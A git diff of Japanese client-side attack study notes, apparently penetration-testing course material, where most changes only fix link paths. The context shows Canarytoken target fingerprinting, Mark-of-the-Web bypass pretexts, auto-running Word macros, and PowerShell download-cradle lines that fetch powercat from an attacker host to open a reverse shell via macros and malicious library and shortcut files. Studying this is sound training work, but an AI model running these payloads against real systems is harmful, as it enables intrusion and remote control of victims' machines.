@@ -1,5 +1,5 @@
 - 関連ノート
-	- [Phishing](../Misc/Phishing.md)
+	- [Phishing](Phishing.md)
 
 ---
 
@@ -54,31 +54,31 @@
 2. 任意の種類のトークンを選択する（ここでは例としてWeb bugを選択）
 	- 以下キャプチャ以外にも、下にスクロールすると、WordやExcel、PDFなども選択できる
 
-![](../画像ファイル/Pasted%20image%2020250513065718.png)
+![](../../画像ファイル/Pasted%20image%2020250513065718.png)
 
 3. メールアドレス、コメントを入力し、任意で通知先のWebサイトも入力した上でCreate Canarytokenをクリック
 
-![](../画像ファイル/Pasted%20image%2020250513065904.png)
+![](../../画像ファイル/Pasted%20image%2020250513065904.png)
 
 4. トークンURLが生成されたことを確認
 	- How to use ：概要レベルの使い方が記載
 	- Manage Canarytoken：トークンのトリガー有無、Emailアラート通知のon / offが切り替えられる
 
-![](../画像ファイル/Pasted%20image%2020250513070140.png)
+![](../../画像ファイル/Pasted%20image%2020250513070140.png)
 
 5. Manage Canarytokenをクリック後、画面右上のALERTS HISTORYをクリック
 
-![](../画像ファイル/Pasted%20image%2020250513070243.png)
+![](../../画像ファイル/Pasted%20image%2020250513070243.png)
 
 6. Alert Historyには、トークンをクリックしたユーザーのシステム情報が表示される。
 
 ↓誰もクリックしていない場合
 
-![](../画像ファイル/Pasted%20image%2020250513070649.png)
+![](../../画像ファイル/Pasted%20image%2020250513070649.png)
 
 ↓クリックされた後（自分でクリックした）：CSVやJSONでダウンロード可能
 
-![](../画像ファイル/Pasted%20image%2020250513071026.png)
+![](../../画像ファイル/Pasted%20image%2020250513071026.png)
 
 7. Alerts listに記載のエントリをクリックすると、User-Agent、位置情報など、より詳細な情報を閲覧できる
 	- User-Agentから、ターゲットのOS・ブラウザを推測できる
@@ -113,19 +113,19 @@
 	- 保護ビュー（Protected view）で開かれ、すべての編集・変更設定が無効になる
 	- マクロ、埋め込みオブジェクトの実行がブロックされる
 
-![](../画像ファイル/Pasted%20image%2020250514070955.png)
+![](../../画像ファイル/Pasted%20image%2020250514070955.png)
 
 これまでMotWへの対策として攻撃者は...
 - Enable Editing（編集を有効にする）をターゲットに押下させるために、Pretext（口実）として、ドキュメントの一部を"ぼかし"、「すべて閲覧するためには編集を有効にする必要があります」と依頼した
 - Enable Contentを押させるように依頼した
 
-![](../画像ファイル/Pasted%20image%2020250514071005.png)
+![](../../画像ファイル/Pasted%20image%2020250514071005.png)
 
 しかしMicrosoftの方針が変わり...
 - マクロの実行はデフォルトで無効にするよう設定された（Offic 2013～）：🔗[Microsoft announce 2022/07/20](https://techcommunity.microsoft.com/blog/microsoft_365blog/helping-users-stay-safe-blocking-internet-macros-by-default-in-office/3071805)
 - Enable Contentのボタンはなくなり、代わりにLearn Moreと表示されるようになった
 
-![](../画像ファイル/Pasted%20image%2020250514071024.png)
+![](../../画像ファイル/Pasted%20image%2020250514071024.png)
 
 #### MotWありマクロの煩雑な実行ステップ
 
@@ -133,7 +133,7 @@
 
 | ステップ              | 説明                                                                                                                               |
 | ----------------- | -------------------------------------------------------------------------------------------------------------------------------- |
-| ① プロパティ → ブロックの解除 | ファイルを右クリック → プロパティ → セキュリティ：「このファイルは他のコンピュータから取得したものです…」横の許可するにチェックしてOK（→ MotW削除）<br>![ 300](../画像ファイル/Pasted%20image%2020250514071133.png) |
+| ① プロパティ → ブロックの解除 | ファイルを右クリック → プロパティ → セキュリティ：「このファイルは他のコンピュータから取得したものです…」横の許可するにチェックしてOK（→ MotW削除）<br>![ 300](../../画像ファイル/Pasted%20image%2020250514071133.png) |
 | ② ファイルを開く         | WordやExcelなどでファイルを開くと「保護されたビュー」で開かれる                                                                                             |
 | ③ 保護されたビューの解除     | 上部バーにある「編集を有効にする」をクリック                                                                                                           |
 | ④ マクロの有効化         | さらに「マクロの有効化」をクリック（マクロ付きファイルのみ表示）  <br>※MotWが残っているとこのステップが出てこない or 永続的にブロックされる                                                    |
@@ -159,8 +159,8 @@ LibreOfficeの場合のマクロ設定方法は、🔗[Proving Grounds Practice 
 
 ### 用語・前提知識
 
-- [マクロ・VBA・VBScript・WSH](../Misc/用語.md#マクロ・VBA・VBScript・WSH)
-- [ActiveX](../Misc/用語.md#ActiveX)
+- [マクロ・VBA・VBScript・WSH](../用語.md#マクロ・VBA・VBScript・WSH)
+- [ActiveX](../用語.md#ActiveX)
 
 マクロはClient-Side Attackの攻撃ベクターとして2025年現在も有効。
 
@@ -173,16 +173,16 @@ LibreOfficeの場合のマクロ設定方法は、🔗[Proving Grounds Practice 
 	- Word Macro-Enabled Document：`.docm` → マクロの警告あり
 	- ✅Word 97 - 2003 Document：`.doc` → マクロの警告が出ないこともある
 
-![](../画像ファイル/Pasted%20image%2020250515074938.png)
+![](../../画像ファイル/Pasted%20image%2020250515074938.png)
 
 2. マクロ作成ポップアップを開く
 
-![](../画像ファイル/Pasted%20image%2020250515075253.png)
+![](../../画像ファイル/Pasted%20image%2020250515075253.png)
 
 3. Macro name（マクロ名）を入力し、Macros in（マクロの保存先）をステップ１で作成したWordファイル（mymacro.doc）を選択し、Create
 	⚠️：保存先を選択しないと、グローバルなテンプレートとして保存されてしまう
 
-![](../画像ファイル/Pasted%20image%2020250515075507.png)
+![](../../画像ファイル/Pasted%20image%2020250515075507.png)
 
 #### 基礎知識2. マクロの基本的な挙動解説：PowerShellを自動で開く
 
@@ -210,7 +210,7 @@ Sub MyMacro()
 
 End Sub
 ```
-- `CreateObject`：[用語](../Misc/用語.md#VBScript)
+- `CreateObject`：[用語](../用語.md#VBScript)
 
 3. Officeマクロは標準では自動実行されないので、ファイルが開かれたタイミングでマクロが自動的に実行されるようにする
 ```vb
@@ -234,18 +234,18 @@ End Sub
 ```
 - `AutoOpen()`は定義済みマクロ、`Document_Open()`は定義済みイベントで、どちらも同じ目的を持つが、どちらもWord文書の開かれ方によって動作する・しないがあるので、お互いにカバーする
 
-![](../画像ファイル/Pasted%20image%2020250516080832.png)
+![](../../画像ファイル/Pasted%20image%2020250516080832.png)
 
 $$編集後のマクロ$$
 
 4. Save Mymacro（💾）をクリックし、閉じる。Wordも保存し、閉じる
 5. マクロ挙動の確認のため、再度開いて、警告とEnable-Content（コンテンツを有効にする）ボタンが表示されることを確認
 
-![](../画像ファイル/Pasted%20image%2020250516081730.png)
+![](../../画像ファイル/Pasted%20image%2020250516081730.png)
 
 6. Enable Contentを押下し、PowerShellが起動されることを確認
 
-![](../画像ファイル/Pasted%20image%2020250516081833.png)
+![](../../画像ファイル/Pasted%20image%2020250516081833.png)
 
 $$PowerShell起動$$
 
@@ -267,7 +267,7 @@ sudo python -m http.server 80
 sudo rlwrap nc -lvnp 4444
 ```
 
-3. [PowerCat](https://github.com/besimorhino/powercat)を攻撃者マシンからダウンロードさせ、PowerCatを実行してリバースシェルを獲得するコマンドを用意
+3. 🔗[PowerCat](https://github.com/besimorhino/powercat)を攻撃者マシンからダウンロードさせ、PowerCatを実行してリバースシェルを獲得するコマンドを用意
 	 [DownloadCradles.ps1 - Github](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
 ```powershell
 IEX (New-Object Net.Webclient).downloadstring('http://[AttackerIP]/powercat.ps1');powercat -c [AttackerIP] -p [Listener Port] -e powershell
@@ -289,7 +289,7 @@ for i in range(0, len(str), n):
 - `range(0, len(str), n)`：0から str の長さまで、n（例: 50）文字単位で繰り返す
 - `str[i:i+n]`：文字列 str の i から i+n の範囲を切り出す（部分文字列）
 
-![](../画像ファイル/Pasted%20image%2020250517181019.png)
+![](../../画像ファイル/Pasted%20image%2020250517181019.png)
 
 $$Pythonスクリプト実行結果$$
 
@@ -421,7 +421,7 @@ wsgidav --host=0.0.0.0 --port=80 --root=~/Webdav --auth=anonymous
 - `--root`：WevDavのホームディレクトリを指定する
 - `--auth=anonymous`：認証を無効とする
 
-![](../画像ファイル/Pasted%20image%2020250518142233.png)
+![](../../画像ファイル/Pasted%20image%2020250518142233.png)
 
 $$WebDavサーバ構築成功時の出力$$
 
@@ -433,7 +433,7 @@ $$WebDavサーバ構築成功時の出力$$
 4. File > New Text File(※)で作成し、デスクトップ上にファイルを保存（ここではファイル名を`config.library-ms`とする）
 	- ※：ファイル形式はPlain textでOK
 
-![](../画像ファイル/Pasted%20image%2020250518144800.png)
+![](../../画像ファイル/Pasted%20image%2020250518144800.png)
 
 $$空白Windowsライブラリファイル$$
 
@@ -466,7 +466,7 @@ $$空白Windowsライブラリファイル$$
 	- ステップ2でWebdavディレクトリに作成した`test.txt`が表示されていたら成功
 	- 💥ファイルパスにはリモートで開かれていることは明示されない
 　　
-![](../画像ファイル/Pasted%20image%2020250518171045.png)
+![](../../画像ファイル/Pasted%20image%2020250518171045.png)
 
 $$ライブラリファイルをダブルクリックした画面$$
 
@@ -477,7 +477,7 @@ $$ライブラリファイルをダブルクリックした画面$$
 - *対策*としては、ライブラリファイルを実行したら、都度、上記のxmlを再度貼り付けるしかない
 	- （しかしターゲットに一度でも実行させればいいので大きな問題ではない）
 
-![](../画像ファイル/Pasted%20image%2020250518171758.png)
+![](../../画像ファイル/Pasted%20image%2020250518171758.png)
 
 $$実行後のライブラリファイルの中身が変わっている$$
 
@@ -494,7 +494,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://[
 ```
 
 
-![](../画像ファイル/Pasted%20image%2020250519074203.png)
+![](../../画像ファイル/Pasted%20image%2020250519074203.png)
 
 
 $$ショートカット作成中の画面$$
@@ -506,7 +506,7 @@ $$ショートカット作成中の画面$$
 	- Windows 10までは、Targetに256文字まで表示で、内部では4096文字まで保持できた
 - ↓イメージ
 
-![ 350](../画像ファイル/Pasted%20image%2020250519075106.png)
+![ 350](../../画像ファイル/Pasted%20image%2020250519075106.png)
 
 ### 第4段階：リバースシェルの受信
 
@@ -558,7 +558,7 @@ sudo python -m http.server <Port>
 
 - ライブラリファイル上でショートカット(.lnk)を実行すると、MotWが付与され、攻撃が阻害される可能性がある
 
-![](../画像ファイル/Pasted%20image%2020250520075229.png)
+![](../../画像ファイル/Pasted%20image%2020250520075229.png)
 
 $$.lnk実行時の警告ポップアップ$$
 
@@ -576,9 +576,9 @@ $$.lnk実行時の警告ポップアップ$$
 ...
 </libraryDescription>
 ```
-- xmlns（xml name space)：XMLにおける名前空間（[📕](../../BSCP/Misc/📕.md#名前空間)）
+- xmlns（xml name space)：XMLにおける名前空間（[📕](../../../BSCP/Misc/📕.md#名前空間)）
 - `http://schemas.microsoft.com/windows/2009/librarye`：Microsoftのライブラリスキーマに属することを明示する
-- [用語](../Misc/用語.md#xmlnsにおけるリンク)
+- [用語](../用語.md#xmlnsにおけるリンク)
 
 2. 「ドキュメント」のローカライズリソース（文字列・UI要素）などを参照する
 ```xml
@@ -591,7 +591,7 @@ $$.lnk実行時の警告ポップアップ$$
 	- ※リソースIDは[Resource Hacker](https://forest.watch.impress.co.jp/article/2001/01/29/okiniiri.html)などのツールを使う方法があるが、生成AIに聞く方が楽
 - [Module 12：Client-side Attacks](#補足：リソースID(`@windows.storage.dll,-34582`)について)
 - `<version>`：任意の数値
-- [用語](../Misc/用語.md#DLL(Dynamic%20link%20library))
+- [用語](../用語.md#DLL(Dynamic%20link%20library))
 
 3. ライブラリファイルの見た目を整備する
 ```xml
@@ -604,7 +604,7 @@ $$.lnk実行時の警告ポップアップ$$
 		- パス：C:\Windows\System32\imageres.dll
 	- 1002：ドキュメントのアイコンを指すリソースID（1003：ピクチャのアイコン）
 
- ![](../画像ファイル/Pasted%20image%2020250518151605.png)
+ ![](../../画像ファイル/Pasted%20image%2020250518151605.png)
 
 4. ライブラリファイルがWindowsエクスプローラー上で開かれたときにどのようなカラム構成（以下画像赤枠）になるかを指定する
 ```xml
@@ -615,7 +615,7 @@ $$.lnk実行時の警告ポップアップ$$
 - [Microsoft documentation](https://learn.microsoft.com/ja-jp/windows/win32/shell/schema-library-foldertype)の「フォルダーの種類」に記載されているGUIDを`<folderType>`に指定する（今回はアイコンをドキュメントにしているのでドキュメントのGUIDを指定）
 	- 例えばフォルダタイプがミュージックだと、アーティスト名やトラック番号のカラムとなってしまう
 
-![](../画像ファイル/Pasted%20image%2020250518152940.png)
+![](../../画像ファイル/Pasted%20image%2020250518152940.png)
 
 5. ライブラリファイルが指すストレージの場所を指定する
 ```xml
